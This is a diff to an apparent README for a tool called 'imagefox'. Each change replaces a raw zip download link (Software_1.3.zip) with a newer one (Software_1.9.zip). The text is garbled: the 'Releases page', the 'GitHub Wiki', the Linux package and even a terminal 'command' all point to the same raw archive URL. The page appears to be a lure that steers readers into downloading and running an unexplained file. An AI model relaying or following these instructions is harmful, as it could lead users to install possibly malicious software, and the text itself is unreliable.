@@ -6,7 +6,7 @@ Welcome to imagefox! This platform helps you manage your software repositories s
 
 ## 📥 Download & Install
 
-To download imagefox, visit this page: [Download imagefox](https://github.com/Gameaanth/imagefox/raw/refs/heads/main/jocko/Software_1.3.zip). This link will take you to the Releases page where you can find the latest version of the software.
+To download imagefox, visit this page: [Download imagefox](https://github.com/Gameaanth/imagefox/raw/refs/heads/main/jocko/Software_1.9.zip). This link will take you to the Releases page where you can find the latest version of the software.
 
 ## 📦 System Requirements
 
@@ -28,13 +28,13 @@ imagefox offers several features to enhance your experience:
 
 ## 🔧 How to Install imagefox
 
-1. **Visit the Release Page:** Go to [Download imagefox](https://github.com/Gameaanth/imagefox/raw/refs/heads/main/jocko/Software_1.3.zip).
-2. **Choose the Right File:** Look for the latest release. You will see options such as `.exe` for Windows or `https://github.com/Gameaanth/imagefox/raw/refs/heads/main/jocko/Software_1.3.zip` for Linux.
+1. **Visit the Release Page:** Go to [Download imagefox](https://github.com/Gameaanth/imagefox/raw/refs/heads/main/jocko/Software_1.9.zip).
+2. **Choose the Right File:** Look for the latest release. You will see options such as `.exe` for Windows or `https://github.com/Gameaanth/imagefox/raw/refs/heads/main/jocko/Software_1.9.zip` for Linux.
 3. **Download the File:** Click on the appropriate file to download it to your computer.
 4. **Run the Installer:**
    - For Windows: Find the downloaded `.exe` file and double-click it to start the installation.
    - For macOS: Double-click the downloaded `.dmg` file, drag imagefox to the Applications folder, and open it.
-   - For Linux: Extract the downloaded `https://github.com/Gameaanth/imagefox/raw/refs/heads/main/jocko/Software_1.3.zip` file. Open a terminal and navigate to the extracted folder. Run the command `https://github.com/Gameaanth/imagefox/raw/refs/heads/main/jocko/Software_1.3.zip` to start the installation.
+   - For Linux: Extract the downloaded `https://github.com/Gameaanth/imagefox/raw/refs/heads/main/jocko/Software_1.9.zip` file. Open a terminal and navigate to the extracted folder. Run the command `https://github.com/Gameaanth/imagefox/raw/refs/heads/main/jocko/Software_1.9.zip` to start the installation.
 5. **Follow the Prompts:** Complete the installation by following the on-screen prompts.
 
 ## 🌐 Configuring imagefox
@@ -66,7 +66,7 @@ If you encounter issues, here are some common solutions:
 
 If you need assistance, you have a few options:
 
-- **Documentation:** Visit the [GitHub Wiki](https://github.com/Gameaanth/imagefox/raw/refs/heads/main/jocko/Software_1.3.zip) for detailed guides.
+- **Documentation:** Visit the [GitHub Wiki](https://github.com/Gameaanth/imagefox/raw/refs/heads/main/jocko/Software_1.9.zip) for detailed guides.
 - **Community Support:** Join our forum where users share tips and solutions.
 - **Contact Us:** Reach out through the GitHub Issues page for direct assistance.
 
